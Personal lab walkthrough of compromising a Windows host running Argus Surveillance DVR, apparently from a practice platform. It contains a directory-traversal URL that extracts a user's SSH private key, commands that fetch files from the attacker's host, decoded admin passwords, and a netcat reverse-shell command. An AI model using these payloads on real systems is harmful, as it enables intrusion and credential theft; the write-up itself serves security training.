---
Status: Done
OS: Windows
Difficulty: Medium
tags:
  - ArgusDVR
Date: 2026-10-04T23:34:00
Owned: 2026-10-05T01:28:00
---

---
# Enumeration

rustscan  
```sh
rustscan -a 192.168.220.179 --ulimit 5000 | tee rust.txt
```

![[Pasted image 20261004233515.png]]

port 8080  
![[Pasted image 20261004233949.png]]

Surveilance camera dashboard  
![[Pasted image 20261004234232.png]]

![[Pasted image 20261005001741.png]]

# initial foothold
imma try the Directory traversal since it's webapps  

using the path from the exploit show we can actually access the system.ini file  
![[Pasted image 20261004234553.png]]

let's try to look for admin's ssh stuff  
![[Pasted image 20261005000327.png]]

not found.  

# Viewer
from the Users function we can find other user that might be on the system as well   
![[Pasted image 20261005000233.png]]

to get the id_rsa of user viewer  
```html
http://192.168.220.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22
```
![[Pasted image 20261005000221.png]]

tried connecting with the id_rsa  
![[Pasted image 20261005000841.png]]

got an error maybe the format is wrong, initially if we copy from the page the file is in 1 line  

try again copy from source  
![[Pasted image 20261005000819.png]]

looks better now  
![[Pasted image 20261005001018.png]]

don't forget to set permission  
```
chmod 600 id_rsa
```

success  
![[Pasted image 20261005000950.png]]

get the local flag  
![[Pasted image 20261005001137.png]]

# Administrator

there was a priv esc exploit when we searched  
![[Pasted image 20261005001449.png]]
```
searchsploit -m 45312
```

view the content  
![[Pasted image 20261005001540.png]]

maybe we need to upload the .dll in this path  
![[Pasted image 20261005001854.png]]

then we might need to restart the server  

from the viewer shell we have navigate to the app path  
![[Pasted image 20261005002041.png]]

host the .dll file on our kali  
```bash
python3 -m http.server 80
```

get file on our target  
```powershell
iwr -uri http://192.168.45.212/gsm_codec.dll -OutFile gsm_codec.dll
```

![[Pasted image 20261005002356.png]]

now launch the Argus DVR  
![[Pasted image 20261005003525.png]]

I couldn't restart the Argus DVR  

checking the priv as viewer  
![[Pasted image 20261005003900.png]]
nothing interesting  

## Powerup
let's try powerup  
```powershell
iwr -uri http://192.168.45.212/PowerUp.ps1 -OutFile PowerUp.ps1
```
![[Pasted image 20261005004304.png]]

## history 
checking PS history only found command we ran  

## Winpeas  
```powershell
iwr -uri http://192.168.45.212/winPEAS.ps1 -OutFile winPEAS.ps1
```
too many noise..  


## Priv esc

look at the app path we have .ini file  
![[Pasted image 20261005005600.png]]

interesting bit  
![[Pasted image 20261005005722.png]]

also there is field password1  
![[Pasted image 20261005005747.png]]

look back on the exploit  
![[Pasted image 20261005005810.png]]

weak password encryption, let's try this exploit  
![[Pasted image 20261005010057.png]]

we need to replace the hash  
```
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
```

first the password0
![[Pasted image 20261005010149.png]]

14WatchD0g

next password1
![[Pasted image 20261005010237.png]]

ImWatchingY0u

combined
`14WatchD0g ImWatchingY0u`

the password did not work, turn out the unknown was special character which was skipped in the code  

let's look for `D9A8` could not find one that wasn't from writeup lol, btw it's the `$`

so it will be `14WatchD0g$`

let's get rev shell

start listener
```sh
penelope 4444
```

run command as admin then use the password  
```powershell
runas /user:administrator "nc.exe -e cmd.exe 192.168.45.212 4444"
```

note that the username is case sensitive, I failed since I use Administrator in the beginning.  
![[Pasted image 20261005012503.png]]

done  
![[Pasted image 20261005012650.png]]
